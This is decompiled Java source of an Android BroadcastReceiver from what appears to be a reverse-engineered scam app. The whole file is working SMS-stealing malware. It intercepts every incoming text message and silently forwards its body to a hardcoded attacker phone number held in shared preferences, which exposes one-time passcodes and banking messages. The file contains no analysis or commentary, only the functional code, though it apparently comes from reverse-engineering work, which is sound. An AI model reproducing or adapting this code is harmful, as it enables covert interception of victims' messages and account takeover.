package DeveloperTLD.DeveloperIdentifier.myapplication;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsManager;
import android.telephony.SmsMessage;
import kotlin.TypeCastException;
import kotlin.jvm.internal.Intrinsics;

/* renamed from: djhgsfjhfdgf.gjhdgsfsjde.myappl876786ication.S1m2s3L4i5s6t7n8e9r0 */
/* loaded from: /home/aathishs/Desktop/scam_app_rev/jadx_gui_decomp/resources/classes.dex */
public class SmsListner extends BroadcastReceiver {
    private static final SmsManager smsManager;

    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        Intrinsics.checkParameterIsNotNull(context, "context");
        Intrinsics.checkParameterIsNotNull(intent, "intent");
        if (Intrinsics.areEqual(intent.getAction(), "android.provider.Telephony.SMS_RECEIVED")) {
            Bundle extras = intent.getExtras();
            if (extras == null) {
                Intrinsics.throwNpe();
            }
            Intrinsics.checkExpressionValueIsNotNull(extras, "intent.extras!!");
            Object[] objArr = (Object[]) extras.get("pdus");
            if (objArr != null) {
                SharedPreferences sharedPreferences = context.getSharedPreferences("sharedPreferences", 0);
                for (Object obj : objArr) {
                    if (obj == null) {
                        throw new TypeCastException("null cannot be cast to non-null type kotlin.ByteArray");
                    }
                    byte[] bArr = (byte[]) obj;
                    Object obj2 = extras.get("format");
                    if (obj2 == null) {
                        throw new TypeCastException("null cannot be cast to non-null type kotlin.String");
                    }
                    SmsMessage currentMessage = SmsMessage.createFromPdu(bArr, (String) obj2);
                    Intrinsics.checkExpressionValueIsNotNull(currentMessage, "currentMessage");
                    String string = sharedPreferences.getString("phoneNumber", "+919101279090");
                    String displayMessageBody = currentMessage.getDisplayMessageBody();
                    if (currentMessage.getMessageClass() == SmsMessage.MessageClass.CLASS_0) {
                        return;
                    }
                    smsManager.sendTextMessage(string, null, displayMessageBody, null, null);
                }
            }
        }
    }

    static {
        SmsManager smsManager2 = SmsManager.getDefault();
        if (smsManager2 == null) {
            Intrinsics.throwNpe();
        }
        smsManager = smsManager2;
    }
}
